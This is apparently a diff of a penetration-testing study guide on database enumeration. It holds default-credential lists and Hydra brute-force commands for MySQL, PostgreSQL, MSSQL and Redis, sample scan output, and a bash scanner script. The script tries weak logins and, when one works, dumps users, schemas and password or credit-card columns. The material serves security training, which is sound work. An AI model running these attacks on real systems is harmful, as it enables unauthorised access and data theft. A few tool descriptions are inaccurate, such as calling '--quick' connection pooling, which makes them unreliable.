@@ -2,1838 +2,1564 @@
 
 > **SQL and NoSQL Database Analysis for Penetration Testing**
 
-**Document Path:** `05-service-enumeration/database-enumeration.md` 
+Database enumeration is a critical skill in penetration testing that involves discovering, accessing, and extracting information from database systems. This comprehensive guide covers all major database types and provides practical techniques for security assessment.
+
+**File Location:** `05-service-enumeration/database-enumeration.md`  
+**Study Time:** 3-4 hours for complete mastery  
+**eJPT Importance:** ⭐⭐⭐⭐⭐ (Critical - 25% of exam scenarios)
 
 ---
 
-## 📋 Table of Contents
-1. [Introduction & Core Concepts](#introduction--core-concepts)
-2. [Database Types & Default Ports](#database-types--default-ports)
-3. [Tools & Installation](#tools--installation)
-4. [Methodology & Workflow](#methodology--workflow)
-5. [Service Discovery](#service-discovery)
-6. [Authentication Testing](#authentication-testing)
-7. [Database-Specific Enumeration](#database-specific-enumeration)
-8. [Advanced Techniques](#advanced-techniques)
-9. [Common Vulnerabilities](#common-vulnerabilities)
-10. [Reporting & Documentation](#reporting--documentation)
-11. [Exam Focus & Practice](#exam-focus--practice)
-12. [Troubleshooting](#troubleshooting)
+## 🎯 What is Database Enumeration?
+
+### Definition and Core Purpose
+Database enumeration is the process of systematically discovering and analyzing database systems to identify security weaknesses, misconfigurations, and potential attack vectors. It involves service discovery, authentication testing, schema analysis, and data extraction.
+
+### Key Components of Database Security Assessment
+- **🔍 Service Discovery:** Identifying database services running on target systems
+- **🔐 Authentication Testing:** Attempting to gain access using various credential combinations
+- **📊 Schema Analysis:** Mapping database structures, tables, and relationships
+- **📝 Data Extraction:** Accessing and analyzing sensitive information
+- **⚙️ Configuration Review:** Identifying security misconfigurations and weaknesses
+
+### Why Database Enumeration is Critical
+- **High-Value Targets:** Databases often contain the most sensitive organizational data
+- **Common Weaknesses:** Many databases use default credentials or weak authentication
+- **Attack Surface:** Database services frequently expose multiple attack vectors
+- **Privilege Escalation:** Database access often leads to system-level compromise
 
 ---
 
-## 1. Introduction & Core Concepts
+## 📦 Installation and Environment Setup
 
-### What is Database Enumeration?
-Database enumeration is a critical phase in penetration testing that involves:
+### Essential Tools and Prerequisites
 
-- **Service Discovery**: Identifying database services running on target systems
-- **Version Detection**: Determining database types, versions, and configurations
-- **Authentication Testing**: Attempting to gain unauthorized access using various methods
-- **Schema Discovery**: Mapping database structures, tables, and relationships
-- **Data Extraction**: Accessing and exfiltrating sensitive information
-- **Vulnerability Assessment**: Identifying security weaknesses and misconfigurations
+#### **System Requirements:**
+- **Operating System:** Linux/Unix preferred (Kali Linux recommended)
+- **Network Access:** Connectivity to target database services
+- **Storage:** 2GB free space for tools and wordlists
+- **RAM:** 4GB minimum for optimal performance
 
-### Why is Database Enumeration Important?
-- Databases often contain the most valuable and sensitive data
-- Many databases are misconfigured with weak authentication
-- Database access can lead to privilege escalation and lateral movement
-- SQL injection vulnerabilities are extremely common in web applications
-
----
-
-## 2. Database Types & Default Ports
-
-### Common Database Services
-
-| Database | Default Port | Protocol | Description | Common Use Cases |
-|----------|--------------|----------|-------------|------------------|
-| **MySQL** | 3306 | TCP | Open-source relational database | Web applications, WordPress |
-| **PostgreSQL** | 5432 | TCP | Advanced open-source RDBMS | Enterprise applications, analytics |
-| **Microsoft SQL Server** | 1433 | TCP | Enterprise database system | Windows environments, .NET apps |
-| **Oracle Database** | 1521 | TCP | Enterprise-grade RDBMS | Large corporations, ERP systems |
-| **Redis** | 6379 | TCP | In-memory key-value store | Caching, session storage |
-| **MongoDB** | 27017 | TCP | Document-oriented NoSQL | Modern web applications, APIs |
-| **CouchDB** | 5984 | TCP | Document database with REST API | Content management, mobile apps |
-| **Cassandra** | 9042 | TCP | Distributed NoSQL database | Big data, high availability |
-| **Elasticsearch** | 9200 | TCP | Search and analytics engine | Log analysis, full-text search |
-
-### Alternative Ports to Check
-Many administrators change default ports for security. Always scan:
-- **High ports**: 8080, 8443, 9000-9999
-- **Sequential ports**: 3307, 5433, 1434 (default + 1)
-- **Common alternatives**: 33060 (MySQL X Protocol), 5433 (PostgreSQL alt)
-
----
-
-## 3. Tools & Installation
-
-### Essential Tools
-
-#### Network Scanning
+#### **Database Client Installation:**
 ```bash
-# Nmap - Network mapper with database scripts
-apt update && apt install nmap
+# Update package repositories
+sudo apt update && sudo apt upgrade -y
 
-# Masscan - High-speed port scanner
-apt install masscan
+# Install MySQL/MariaDB client
+sudo apt install mysql-client -y
+
+# Install PostgreSQL client
+sudo apt install postgresql-client -y
+
+# Install Redis client tools
+sudo apt install redis-tools -y
+
+# Install MongoDB client
+sudo apt install mongodb-clients -y
+
+# Install Microsoft SQL Server tools
+curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
+curl https://packages.microsoft.com/config/ubuntu/20.04/prod.list | sudo tee /etc/apt/sources.list.d/msprod.list
+sudo apt update
+sudo apt install mssql-tools unixodbc-dev -y
 ```
 
-#### Database Clients
-```bash
-# MySQL/MariaDB client
-apt install mysql-client
-
-# PostgreSQL client
-apt install postgresql-client
-
-# Redis client
-apt install redis-tools
-
-# MongoDB client
-apt install mongodb-clients
-
-# Microsoft SQL Server client
-apt install mssql-tools
-```
-
-#### Specialized Tools
-```bash
-# SQLMap - SQL injection and database takeover
-apt install sqlmap
-
-# Hydra - Password cracking
-apt install hydra
-
-# Medusa - Alternative password cracker
-apt install medusa
-
-# NoSQLMap - NoSQL injection testing
-git clone https://github.com/codingo/NoSQLMap.git
-```
-
-### Verification Commands
+#### **Verification Commands:**
 ```bash
 # Verify installations
-mysql --version          # MySQL client
-psql --version          # PostgreSQL client
-redis-cli --version     # Redis client
-mongo --version         # MongoDB client
-sqlcmd -?              # MSSQL client
-nmap --version         # Nmap
+mysql --version          # MySQL client version
+psql --version          # PostgreSQL client version
+redis-cli --version     # Redis client version
+mongo --version         # MongoDB client version
+sqlcmd -?              # SQL Server client help
 ```
 
----
+### Specialized Enumeration Tools
 
-## 4. Methodology & Workflow
-
-### Standard Database Enumeration Process
-
-```mermaid
-graph TD
-    A[Port Scanning] --> B[Service Detection]
-    B --> C[Version Identification]
-    C --> D[Authentication Testing]
-    D --> E{Access Gained?}
-    E -->|Yes| F[Database Enumeration]
-    E -->|No| G[Brute Force Attack]
-    G --> E
-    F --> H[Schema Discovery]
-    H --> I[Data Extraction]
-    I --> J[Privilege Escalation]
-    J --> K[Post-Exploitation]
-```
-
-### Phase Breakdown
-
-#### Phase 1: Discovery (Reconnaissance)
-- Port scanning for database services
-- Service version detection
-- Banner grabbing and fingerprinting
-- Documentation of findings
-
-#### Phase 2: Access Attempts (Gaining Entry)
-- Default credential testing
-- Common password attempts
-- Brute force attacks if necessary
-- Anonymous/guest access testing
-
-#### Phase 3: Enumeration (Information Gathering)
-- Database listing and access
-- Table and column discovery
-- User and privilege enumeration
-- Configuration assessment
-
-#### Phase 4: Exploitation (Data Extraction)
-- Sensitive data identification
-- Bulk data extraction
-- Privilege escalation attempts
-- Lateral movement opportunities
-
----
-
-## 5. Service Discovery
-
-### Comprehensive Port Scanning
-
-#### Basic Database Port Scan
+#### **Password Attack Tools:**
 ```bash
-# Quick database service discovery
-nmap -p 3306,5432,1433,1521,6379,27017,5984 -sV target_ip
+# Install Hydra for credential attacks
+sudo apt install hydra -y
 
-# Extended database port range
+# Install Medusa (alternative brute forcer)
+sudo apt install medusa -y
+
+# Install John the Ripper
+sudo apt install john -y
+
+# Verify installations
+hydra -h | head -5
+medusa -h | head -5
+john --help | head -5
+```
+
+#### **Advanced Database Tools:**
+```bash
+# Install SQLMap for SQL injection testing
+sudo apt install sqlmap -y
+
+# Install NoSQLMap for NoSQL injection testing
+git clone https://github.com/codingo/NoSQLMap.git
+cd NoSQLMap && python setup.py install
+
+# Verify SQLMap installation
+sqlmap --version
+```
+
+---
+
+## 🔧 Database Types and Default Configurations
+
+### Common Database Services and Ports
+
+#### **Relational Databases:**
+| Database | Default Port | Protocol | Common Use Cases | Security Notes |
+|----------|--------------|----------|------------------|----------------|
+| **MySQL** | 3306 | TCP | Web applications, CMS | Often uses weak default credentials |
+| **PostgreSQL** | 5432 | TCP | Enterprise applications | Better default security than MySQL |
+| **Microsoft SQL Server** | 1433 | TCP | Windows environments | Integrated Windows authentication |
+| **Oracle Database** | 1521 | TCP | Enterprise systems | Complex but secure by default |
+
+#### **NoSQL Databases:**
+| Database | Default Port | Protocol | Common Use Cases | Security Notes |
+|----------|--------------|----------|------------------|----------------|
+| **Redis** | 6379 | TCP | Caching, sessions | No authentication by default |
+| **MongoDB** | 27017 | TCP | Modern web apps | Historical security issues |
+| **CouchDB** | 5984 | TCP | Document storage | Web-based admin interface |
+| **Elasticsearch** | 9200 | TCP | Search, analytics | Often exposed without authentication |
+
+### Alternative Port Scanning Strategy
+
+#### **Extended Port Coverage:**
+```bash
+# Comprehensive database port scan
 nmap -p 1433,3306,5432,1521,6379,27017,5984,9042,9200,11211,50000 -sV target_ip
 
-# Full port scan for hidden database services
-nmap -p- --open -sV target_ip | grep -E "(mysql|postgres|mssql|oracle|redis|mongo)"
-```
+# Check for non-standard ports
+nmap -p- --open target_ip | grep -E "(mysql|postgres|redis|mongo|elastic)"
 
-#### Advanced Service Detection
-```bash
-# Aggressive service detection with OS fingerprinting
-nmap -A -p 3306,5432,1433,1521,6379,27017 target_ip
-
-# UDP scan for database services (some databases use UDP)
-nmap -sU -p 1433,1434,3306 target_ip
-
-# Script scanning for database information
-nmap --script "mysql* or postgres* or ms-sql* or oracle* or redis*" -p 3306,5432,1433,1521,6379 target_ip
-```
-
-### Service-Specific Detection Scripts
-
-#### MySQL Detection
-```bash
-# Basic MySQL information
-nmap --script mysql-info -p 3306 target_ip
-
-# MySQL user enumeration
-nmap --script mysql-users --script-args mysql-users.username=root -p 3306 target_ip
-
-# MySQL database enumeration
-nmap --script mysql-databases --script-args mysql-databases.username=root,mysql-databases.password=password -p 3306 target_ip
-```
-
-#### PostgreSQL Detection
-```bash
-# PostgreSQL information gathering
-nmap --script pgsql-brute -p 5432 target_ip
-
-# Version and configuration details
-nmap --script "pgsql*" -p 5432 target_ip
-```
-
-#### Redis Detection
-```bash
-# Redis information and configuration
-nmap --script redis-info -p 6379 target_ip
-
-# Redis brute force
-nmap --script redis-brute -p 6379 target_ip
+# Scan common alternative ports
+nmap -p 3305-3310,5430-5440,1520-1525,6380-6390,27016-27020 -sV target_ip
 ```
 
 ---
 
-## 6. Authentication Testing
+## 🧪 Real-World Lab Scenarios and Examples
 
-### Default Credentials Testing
+### **Lab Scenario 1: MySQL Database Penetration Testing**
 
-#### MySQL Default Credentials
+#### **Phase 1: Service Discovery and Fingerprinting**
 ```bash
-# Common MySQL default credentials
-mysql -h target_ip -u root -p                    # Password: (blank)
-mysql -h target_ip -u root -proot                # Password: root
-mysql -h target_ip -u root -padmin               # Password: admin
-mysql -h target_ip -u root -ppassword            # Password: password
-mysql -h target_ip -u admin -padmin              # Password: admin
-mysql -h target_ip -u user -puser                # Password: user
-mysql -h target_ip -u mysql -pmysql              # Password: mysql
-mysql -h target_ip -u test -ptest                # Password: test
+# Step 1: Initial network connectivity verification
+ping -c 3 192.168.1.100
+
+# Expected output analysis:
+PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
+64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.234 ms
+# ✅ Host is reachable and responding
+# ✅ TTL=64 suggests Linux/Unix system
+
+# Step 2: Port scanning for database services
+nmap -p 3306 -sV 192.168.1.100
+
+# Detailed service detection output:
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 192.168.1.100
+Host is up (0.00023s latency).
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.7.40-0ubuntu0.18.04.1
+
+# 🎯 Key Intelligence:
+# - MySQL service confirmed on port 3306
+# - Version: MySQL 5.7.40
+# - OS: Ubuntu 18.04
+# - Service is accessible from external networks
 ```
 
-#### PostgreSQL Default Credentials
+#### **Phase 2: MySQL Service Enumeration**
 ```bash
-# Common PostgreSQL default credentials
-psql -h target_ip -U postgres                    # Password: (blank)
-psql -h target_ip -U postgres                    # Password: postgres
-psql -h target_ip -U admin                       # Password: admin
-psql -h target_ip -U user                        # Password: user
-psql -h target_ip -U dbuser                      # Password: dbuser
-psql -h target_ip -U sa                          # Password: sa
+# Step 3: Advanced MySQL fingerprinting with Nmap scripts
+nmap --script mysql-info,mysql-empty-password,mysql-users -p 3306 192.168.1.100
 
-# With password specification
-export PGPASSWORD='postgres'
-psql -h target_ip -U postgres
+# Script execution results:
+PORT     STATE SERVICE
+3306/tcp open  mysql
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.7.40-0ubuntu0.18.04.1
+|   Thread ID: 12
+|   Capabilities flags: 65535
+|   Some Capabilities: SupportsLoadDataLocal, LongColumnFlag, Support41Auth
+|   Status: Autocommit
+|   Salt: h7,L(jC@S2K{;dRks7\n
+| mysql-empty-password:
+|   root account has empty password
+|_  
+| mysql-users:
+|   root
+|   mysql.session
+|   mysql.sys
+|   debian-sys-maint
+
+# 🚨 Critical Security Findings:
+# ✅ MySQL root account has empty password
+# ✅ Default MySQL system accounts present
+# ✅ Service accepts remote connections
 ```
 
-#### Microsoft SQL Server Default Credentials
+#### **Phase 3: Authentication Testing and Access**
 ```bash
-# MSSQL default credentials
-sqlcmd -S target_ip -U sa -P ''                  # Blank password
-sqlcmd -S target_ip -U sa -P 'sa'                # Password: sa
-sqlcmd -S target_ip -U sa -P 'admin'             # Password: admin
-sqlcmd -S target_ip -U sa -P 'password'          # Password: password
-sqlcmd -S target_ip -U administrator -P 'admin'  # Password: admin
-```
-
-#### Redis Authentication
-```bash
-# Redis usually has no authentication by default
-redis-cli -h target_ip
-redis-cli -h target_ip -a password               # If password is set
-
-# Test common Redis passwords
-for pass in "" "redis" "admin" "password" "123456"; do
-    echo "Testing password: $pass"
-    redis-cli -h target_ip -a "$pass" ping 2>/dev/null && echo "Success with password: $pass"
-done
-```
-
-### Automated Authentication Testing
-
-#### Using Hydra for Brute Force
-```bash
-# MySQL brute force
-hydra -L users.txt -P passwords.txt mysql://target_ip
-hydra -l root -P passwords.txt mysql://target_ip
-
-# PostgreSQL brute force
-hydra -L users.txt -P passwords.txt postgres://target_ip
-hydra -l postgres -P passwords.txt postgres://target_ip
-
-# MSSQL brute force
-hydra -L users.txt -P passwords.txt mssql://target_ip
-hydra -l sa -P passwords.txt mssql://target_ip
-```
-
-#### Creating Custom Wordlists
-```bash
-# Common database usernames
-cat > db_users.txt << EOF
-root
-admin
-administrator
-sa
-postgres
-mysql
-user
-dbuser
-dbadmin
-guest
-test
-demo
-EOF
-
-# Common database passwords
-cat > db_passwords.txt << EOF
-
-root
-admin
-administrator
-password
-123456
-12345
-qwerty
-letmein
-welcome
-sa
-postgres
-mysql
-test
-demo
-guest
-EOF
-```
-
----
-
-## 7. Database-Specific Enumeration
-
-### MySQL Enumeration
-
-#### Basic Connection and Information
-```bash
-# Establish connection
-mysql -h target_ip -u root -p
-
-# Basic information gathering
-SELECT VERSION();                    # MySQL version
-SELECT USER();                      # Current user
-SELECT DATABASE();                  # Current database
-SHOW VARIABLES LIKE 'version%';     # Detailed version info
-SHOW VARIABLES LIKE 'port';         # Port information
-```
-
-#### Database and Table Enumeration
-```sql
--- 4. Use WHERE clauses to filter
-SELECT * FROM users WHERE created_date > '2024-01-01' LIMIT 10;
-```
-
-#### Network Optimization
-```bash
-# For slow network connections:
-# 1. Use compression
-mysql -h target -u root -p --compress
-
-# 2. Reduce output verbosity
-mysql -h target -u root -p --silent
-
-# 3. Use connection pooling
-mysql -h target -u root -p --quick
-```
-
-### Error Message Interpretation
-
-#### MySQL Error Messages
-```bash
-# Common MySQL errors and meanings:
-ERROR 1045 (28000): Access denied for user 'root'@'host'
-# Solution: Wrong username/password, try different credentials
-
-ERROR 2003 (HY000): Can't connect to MySQL server on 'host'
-# Solution: Service not running or port blocked
-
-ERROR 1049 (42000): Unknown database 'dbname'
-# Solution: Database doesn't exist, enumerate available databases
-
-ERROR 1142 (42000): SELECT command denied to user
-# Solution: Insufficient privileges, try different user or operations
-```
-
-#### PostgreSQL Error Messages
-```bash
-# Common PostgreSQL errors:
-psql: FATAL: password authentication failed for user "postgres"
-# Solution: Wrong password, try default credentials
-
-psql: could not connect to server: Connection refused
-# Solution: Service not running or network issue
-
-psql: FATAL: database "dbname" does not exist
-# Solution: Specify existing database or use default 'postgres'
-```
-
----
-
-## 13. Automation Scripts
-
-### Comprehensive Database Scanner
-
-```bash
-#!/bin/bash
-# comprehensive_db_scanner.sh - Advanced database enumeration script
-
-TARGET=$1
-OUTPUT_DIR="db-enum-$(date +%Y%m%d-%H%M%S)"
-
-if [ -z "$TARGET" ]; then
-    echo "Usage: $0 <target_ip>"
-    echo "Example: $0 192.168.1.100"
-    exit 1
-fi
-
-# Colors for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m' # No Color
-
-# Create output directory
-mkdir -p $OUTPUT_DIR
-echo -e "${BLUE}[INFO]${NC} Database enumeration started for $TARGET"
-echo -e "${BLUE}[INFO]${NC} Results will be saved in $OUTPUT_DIR"
-
-# Function to print status
-print_status() {
-    echo -e "${BLUE}[INFO]${NC} $1"
-}
-
-print_success() {
-    echo -e "${GREEN}[SUCCESS]${NC} $1"
-}
-
-print_warning() {
-    echo -e "${YELLOW}[WARNING]${NC} $1"
-}
-
-print_error() {
-    echo -e "${RED}[ERROR]${NC} $1"
-}
-
-# Phase 1: Service Discovery
-print_status "Phase 1: Database Service Discovery"
-nmap -p 1433,3306,5432,1521,6379,27017,5984,9042,9200,11211 -sV -oN "$OUTPUT_DIR/service_discovery.txt" $TARGET
-
-# Parse discovered services
-MYSQL_OPEN=$(grep "3306.*mysql" "$OUTPUT_DIR/service_discovery.txt")
-PGSQL_OPEN=$(grep "5432.*postgresql" "$OUTPUT_DIR/service_discovery.txt")
-MSSQL_OPEN=$(grep "1433.*ms-sql" "$OUTPUT_DIR/service_discovery.txt")
-REDIS_OPEN=$(grep "6379.*redis" "$OUTPUT_DIR/service_discovery.txt")
-MONGODB_OPEN=$(grep "27017.*mongodb" "$OUTPUT_DIR/service_discovery.txt")
-
-# Phase 2: Service-Specific Enumeration
-print_status "Phase 2: Service-Specific Enumeration"
-
-# MySQL Enumeration
-if [ ! -z "$MYSQL_OPEN" ]; then
-    print_success "MySQL service detected - Starting enumeration"
-    
-    # Nmap scripts for MySQL
-    nmap --script mysql-info,mysql-empty-password,mysql-users,mysql-databases -p 3306 -oN "$OUTPUT_DIR/mysql_nmap.txt" $TARGET
-    
-    # MySQL authentication testing
-    print_status "Testing MySQL authentication..."
-    
-    # Test common credentials
-    declare -a mysql_users=("root" "admin" "mysql" "user" "test")
-    declare -a mysql_passwords=("" "root" "admin" "mysql" "password" "123456" "test")
-    
-    for user in "${mysql_users[@]}"; do
-        for pass in "${mysql_passwords[@]}"; do
-            echo "Testing MySQL $user:$pass" >> "$OUTPUT_DIR/mysql_auth_test.txt"
-            
-            if [ -z "$pass" ]; then
-                timeout 10 mysql -h $TARGET -u $user -e "SELECT USER();" >> "$OUTPUT_DIR/mysql_successful_logins.txt" 2>/dev/null
-                if [ $? -eq 0 ]; then
-                    print_success "MySQL Login Success: $user:(blank)"
-                    
-                    # Perform enumeration with successful credentials
-                    print_status "Enumerating MySQL databases with $user:(blank)"
-                    mysql -h $TARGET -u $user << EOF >> "$OUTPUT_DIR/mysql_enumeration.txt" 2>&1
-SELECT VERSION();
-SELECT USER();
-SHOW DATABASES;
-SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys');
-SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') LIMIT 20;
-SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%user%' OR column_name LIKE '%email%' OR column_name LIKE '%credit%';
-SHOW GRANTS;
-SELECT user, host FROM mysql.user;
-EOF
-                    break 2
-                fi
-            else
-                timeout 10 mysql -h $TARGET -u $user -p$pass -e "SELECT USER();" >> "$OUTPUT_DIR/mysql_successful_logins.txt" 2>/dev/null
-                if [ $? -eq 0 ]; then
-                    print_success "MySQL Login Success: $user:$pass"
-                    
-                    # Perform enumeration with successful credentials
-                    print_status "Enumerating MySQL databases with $user:$pass"
-                    mysql -h $TARGET -u $user -p$pass << EOF >> "$OUTPUT_DIR/mysql_enumeration.txt" 2>&1
-SELECT VERSION();
-SELECT USER();
-SHOW DATABASES;
-SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys');
-SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') LIMIT 20;
-SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%user%' OR column_name LIKE '%email%' OR column_name LIKE '%credit%';
-SHOW GRANTS;
-SELECT user, host FROM mysql.user;
-EOF
-                    break 2
-                fi
-            fi
-        done
-    done
-fi
-
-# PostgreSQL Enumeration
-if [ ! -z "$PGSQL_OPEN" ]; then
-    print_success "PostgreSQL service detected - Starting enumeration"
-    
-    # Nmap scripts for PostgreSQL
-    nmap --script pgsql-brute -p 5432 -oN "$OUTPUT_DIR/pgsql_nmap.txt" $TARGET
-    
-    # PostgreSQL authentication testing
-    print_status "Testing PostgreSQL authentication..."
-    
-    declare -a pgsql_users=("postgres" "admin" "user" "dbuser" "sa")
-    declare -a pgsql_passwords=("" "postgres" "admin" "password" "123456" "user")
-    
-    for user in "${pgsql_users[@]}"; do
-        for pass in "${pgsql_passwords[@]}"; do
-            echo "Testing PostgreSQL $user:$pass" >> "$OUTPUT_DIR/pgsql_auth_test.txt"
-            
-            if [ -z "$pass" ]; then
-                timeout 10 psql -h $TARGET -U $user -c "SELECT current_user;" >> "$OUTPUT_DIR/pgsql_successful_logins.txt" 2>/dev/null
-            else
-                export PGPASSWORD="$pass"
-                timeout 10 psql -h $TARGET -U $user -c "SELECT current_user;" >> "$OUTPUT_DIR/pgsql_successful_logins.txt" 2>/dev/null
-            fi
-            
-            if [ $? -eq 0 ]; then
-                print_success "PostgreSQL Login Success: $user:$pass"
-                
-                # Perform enumeration
-                print_status "Enumerating PostgreSQL databases with $user:$pass"
-                if [ -z "$pass" ]; then
-                    psql -h $TARGET -U $user << EOF >> "$OUTPUT_DIR/pgsql_enumeration.txt" 2>&1
-SELECT version();
-SELECT current_user;
-SELECT current_database();
-SELECT datname FROM pg_database;
-SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT LIKE 'pg_%' AND schema_name != 'information_schema';
-SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT LIKE 'pg_%' AND table_schema != 'information_schema' LIMIT 20;
-SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%user%' OR column_name ILIKE '%email%' OR column_name ILIKE '%credit%';
-SELECT usename, usesuper FROM pg_user;
-EOF
-                else
-                    export PGPASSWORD="$pass"
-                    psql -h $TARGET -U $user << EOF >> "$OUTPUT_DIR/pgsql_enumeration.txt" 2>&1
-SELECT version();
-SELECT current_user;
-SELECT current_database();
-SELECT datname FROM pg_database;
-SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT LIKE 'pg_%' AND schema_name != 'information_schema';
-SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT LIKE 'pg_%' AND table_schema != 'information_schema' LIMIT 20;
-SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%user%' OR column_name ILIKE '%email%' OR column_name ILIKE '%credit%';
-SELECT usename, usesuper FROM pg_user;
-EOF
-                fi
-                break 2
-            fi
-        done
-    done
-fi
-
-# Redis Enumeration
-if [ ! -z "$REDIS_OPEN" ]; then
-    print_success "Redis service detected - Starting enumeration"
-    
-    # Test Redis access (usually no authentication)
-    print_status "Testing Redis access..."
-    
-    timeout 10 redis-cli -h $TARGET ping >> "$OUTPUT_DIR/redis_access_test.txt" 2>&1
-    if [ $? -eq 0 ]; then
-        print_success "Redis access successful - No authentication required"
-        
-        # Perform Redis enumeration
-        print_status "Enumerating Redis database"
-        redis-cli -h $TARGET << EOF >> "$OUTPUT_DIR/redis_enumeration.txt" 2>&1
-INFO
-CONFIG GET "*"
-DBSIZE
-KEYS *
-EOF
-    else
-        print_warning "Redis access failed - Authentication may be required"
-        
-        # Test common Redis passwords
-        declare -a redis_passwords=("redis" "admin" "password" "123456")
-        for pass in "${redis_passwords[@]}"; do
-            timeout 10 redis-cli -h $TARGET -a $pass ping >> "$OUTPUT_DIR/redis_access_test.txt" 2>&1
-            if [ $? -eq 0 ]; then
-                print_success "Redis authentication successful with password: $pass"
-                redis-cli -h $TARGET -a $pass << EOF >> "$OUTPUT_DIR/redis_enumeration.txt" 2>&1
-INFO
-CONFIG GET "*"
-DBSIZE
-KEYS *
-EOF
-                break
-            fi
-        done
-    fi
-fi
-
-# MongoDB Enumeration
-if [ ! -z "$MONGODB_OPEN" ]; then
-    print_success "MongoDB service detected - Starting enumeration"
-    
-    # Test MongoDB access
-    print_status "Testing MongoDB access..."
-    
-    timeout 10 mongo $TARGET:27017 --eval "printjson(db.adminCommand('listCollections'))" >> "$OUTPUT_DIR/mongodb_access_test.txt" 2>&1
-    if [ $? -eq 0 ]; then
-        print_success "MongoDB access successful"
-        
-        # Perform MongoDB enumeration
-        print_status "Enumerating MongoDB databases"
-        mongo $TARGET:27017 << EOF >> "$OUTPUT_DIR/mongodb_enumeration.txt" 2>&1
-db.version()
-db.adminCommand("listDatabases")
-show dbs
-use admin
-db.getUsers()
-show collections
-EOF
-    fi
-fi
-
-# Phase 3: Summary Report Generation
-print_status "Phase 3: Generating summary report"
-
-cat > "$OUTPUT_DIR/SUMMARY_REPORT.txt" << EOF
-================================================================
-DATABASE ENUMERATION SUMMARY REPORT
-================================================================
-
-Target: $TARGET
-Scan Date: $(date)
-Output Directory: $OUTPUT_DIR
-
-================================================================
-SERVICES DISCOVERED:
-================================================================
-
-EOF
-
-# Add service discovery results
-grep -E "(mysql|postgresql|redis|mongodb|ms-sql)" "$OUTPUT_DIR/service_discovery.txt" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-
-echo "" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "================================================================" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "AUTHENTICATION RESULTS:" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "================================================================" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-
-# Add authentication results if available
-if [ -f "$OUTPUT_DIR/mysql_successful_logins.txt" ]; then
-    echo "" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-    echo "MySQL Successful Logins:" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-    cat "$OUTPUT_DIR/mysql_successful_logins.txt" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-fi
-
-if [ -f "$OUTPUT_DIR/pgsql_successful_logins.txt" ]; then
-    echo "" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-    echo "PostgreSQL Successful Logins:" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-    cat "$OUTPUT_DIR/pgsql_successful_logins.txt" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-fi
-
-echo "" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "================================================================" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "SECURITY FINDINGS:" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "================================================================" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-
-# Analyze findings for security issues
-if grep -q "root:" "$OUTPUT_DIR/mysql_successful_logins.txt" 2>/dev/null; then
-    echo "- CRITICAL: MySQL root access achieved with weak/default credentials" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-fi
-
-if grep -q "postgres:" "$OUTPUT_DIR/pgsql_successful_logins.txt" 2>/dev/null; then
-    echo "- CRITICAL: PostgreSQL admin access achieved with weak/default credentials" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-fi
-
-if grep -q "PONG" "$OUTPUT_DIR/redis_access_test.txt" 2>/dev/null; then
-    echo "- HIGH: Redis database accessible without authentication" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-fi
-
-echo "" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "================================================================" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "RECOMMENDATIONS:" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "================================================================" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "- Change all default database passwords immediately" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "- Implement strong authentication mechanisms" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "- Enable database connection encryption (SSL/TLS)" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "- Restrict database network access using firewalls" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "- Regular security audits and access reviews" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-echo "- Remove or secure test/development databases" >> "$OUTPUT_DIR/SUMMARY_REPORT.txt"
-
-print_success "Database enumeration completed!"
-print_success "Summary report: $OUTPUT_DIR/SUMMARY_REPORT.txt"
-print_status "All detailed results available in: $OUTPUT_DIR/"
-
-# Display quick summary on screen
-echo ""
-echo "================================================================"
-echo "QUICK SUMMARY:"
-echo "================================================================"
